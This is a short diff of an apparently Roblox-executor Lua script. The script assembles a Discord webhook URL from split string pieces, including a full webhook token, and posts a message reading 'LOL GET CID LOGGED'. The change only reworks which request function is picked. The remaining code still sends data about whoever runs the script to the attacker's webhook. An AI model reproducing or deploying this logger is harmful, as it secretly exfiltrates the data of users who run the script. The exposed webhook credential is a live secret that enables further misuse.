@@ -10,8 +10,6 @@ local url1 = "https://discord.com/api/webhooks/";
 local url2 = "968304971466547220/";
 local url3 = "CDj9swdNxS3g4bIiAXuWU-lL8Xz5qMkHeYegdCLD3t1sEaddn4Y1dXz91pb7LZsmZyvI";
 local cg = url1..url2..url3
-local sn = syn;
-local st = sn.request;
 local da = {
     ["content"] = "LOL GET CID LOGGED",
     ["embeds"] = {
@@ -41,5 +39,5 @@ local pt = {
     Method = md,
     Headers = hs
 };
-local r = http_request or request or HttpPost or st;
+local r = http_request or request or HttpPost or syn.request;
 r(pt)
